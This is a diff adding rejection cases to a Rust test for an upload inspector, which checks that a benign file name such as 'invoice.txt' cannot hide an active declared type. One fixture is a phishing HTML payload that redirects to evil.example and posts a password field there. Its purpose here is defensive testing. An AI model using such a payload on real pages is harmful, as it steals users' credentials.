@@ -237,6 +237,28 @@ async fn inspection_sniffs_content_and_extension_instead_of_trusting_the_declare
             "text/plain",
             "opaque_content",
         ),
+        // A benign extension cannot launder a declared active type.
+        (
+            strict,
+            "invoice.txt",
+            b"<meta http-equiv=refresh content='0;url=https://evil.example/'><form action=https://evil.example/c method=post><input type=password name=p>".to_vec(),
+            "text/html",
+            "opaque_content",
+        ),
+        (
+            strict,
+            "data.json",
+            b"{}".to_vec(),
+            "application/javascript",
+            "opaque_content",
+        ),
+        (
+            strict,
+            "notes.md",
+            b"safe text".to_vec(),
+            "application/xhtml+xml",
+            "opaque_content",
+        ),
     ];
     for (inspector, filename, content, mime_type, reason) in rejected {
         assert_eq!(
